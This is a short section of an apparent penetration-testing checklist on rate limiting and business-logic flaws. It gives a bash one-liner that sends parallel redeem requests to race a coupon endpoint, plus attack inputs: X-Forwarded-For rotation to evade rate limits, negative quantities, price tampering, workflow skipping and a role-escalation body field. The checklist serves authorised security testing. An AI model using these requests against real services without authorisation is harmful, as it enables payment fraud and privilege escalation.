## 3H. Rate Limiting & Business Logic
*CRUXSS-API-RATE-01 through -03 | CRUXSS-BUSL-01 through -10*

```bash
# Race conditions — coupon / OTP / fund transfer (CRUXSS-BUSL-04, CRUXSS-BUSL-05)
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" \
  -d 'code=PROMO10' &
wait

# Rate limit bypass (CRUXSS-API-RATE-01)
# Try: X-Forwarded-For: 1.2.3.$i rotation, different user agents

# Business logic (CRUXSS-BUSL-01 through -10)
# Negative quantities: {"quantity": -1}
# Price tampering: {"price": 0.001}
# Workflow skip: access step 3 URL directly without step 2
# Role escalation: {"role": "admin"} in registration body
# Payment: zero amount, negative price, currency manipulation
```

---

